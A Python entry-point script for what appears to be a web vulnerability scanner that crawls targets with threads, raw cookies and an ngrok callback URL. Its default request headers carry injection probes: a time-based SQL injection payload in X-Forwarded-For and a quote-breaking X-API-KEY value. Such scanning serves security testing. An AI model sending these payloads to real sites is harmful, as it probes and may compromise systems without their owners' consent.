import os

import requests
from flask import Flask
from dotenv import load_dotenv

from Managers.CacheManager import CacheManager
from Managers.CookieManager import CookieManager
from Managers.SubdomainManager import SubdomainManager
from Managers.ThreadManager import ThreadManager

headers = {
    'Cache-Control': 'max-age=0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'X-Forwarded-For': 'XOR(if(1=1,sleep(5),0))OR',
    'X-API-KEY': 'xapikeypoc\'',
}

app = Flask(__name__)
load_dotenv('config.env')


@app.route("/")
def index():
    return "Hello World!"


@app.route("/clear")
def clear():
    return CacheManager.clear_all()


# @app.route("/run")
# def main():
if __name__ == '__main__':
    # man = SubdomainManager()
    # man.get_subdomains()

    is_single_check = os.environ.get('is_single_check')
    max_depth = os.environ.get('max_depth')
    batch_size = os.environ.get('batch_size')
    ngrok_url = os.environ.get('ngrok_url')
    download_path = os.environ.get('download_path')
    thread_man = ThreadManager(batch_size, download_path, max_depth, headers, ngrok_url)

    if bool(is_single_check):
        start_url = os.environ.get('start_url')
        raw_cookies = os.environ.get('raw_cookies')
        print(f'start_url - {start_url}')
        print(f'raw_cookies - {raw_cookies}')
        thread_man.run_single(start_url, raw_cookies)
    else:
        print(f'is_single_check - {is_single_check}')
        thread_man.run_all()


# if __name__ == '__main__':
#     app.run(host='0.0.0.0', port='8888', debug=True)
